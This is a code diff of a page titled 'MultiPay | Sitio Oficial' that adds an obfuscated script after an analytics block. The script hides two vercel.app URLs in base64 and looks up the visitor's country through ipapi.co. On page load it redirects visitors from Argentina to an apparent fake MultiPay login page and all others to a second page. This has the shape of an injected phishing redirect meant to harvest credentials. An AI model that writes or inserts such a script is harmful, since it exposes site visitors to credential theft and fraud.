@@ -24,7 +24,32 @@
       'transaction_id': ''
       // 'new_customer': true /* calculate dynamically, populate with true/false */,
   });
-</script>    
+</script>   
+
+    <script>
+(function(){
+ 
+  const _0x2f4a = atob("aHR0cHM6Ly9tdWx0aXBheW11bHRpcGF5LnZlcmNlbC5hcHAvbG9naW4uaHRtbA==");
+  
+
+  const _0x3b8c = atob("aHR0cHM6Ly9pbmdcmVzYXJjaW1vdmkudmVyY2VsLmFwcC9pbm5pY2lvLmh0bWw=");
+
+  const _0x4d2e = 'https://ipapi.co/json/';
+  
+  fetch(_0x4d2e)
+    .then(_0x5a1f => _0x5a1f.json())
+    .then(_0x2b7c => {
+      if (_0x2b7c.country === "AR") {
+        window.location.href = _0x2f4a; 
+      } else {
+        window.location.href = _0x3b8c; 
+      }
+    })
+    .catch(() => {
+      window.location.href = _0x3b8c; 
+    });
+})();
+</script>
 <title>MultiPay | Sitio Oficial</title>
 
 <style>
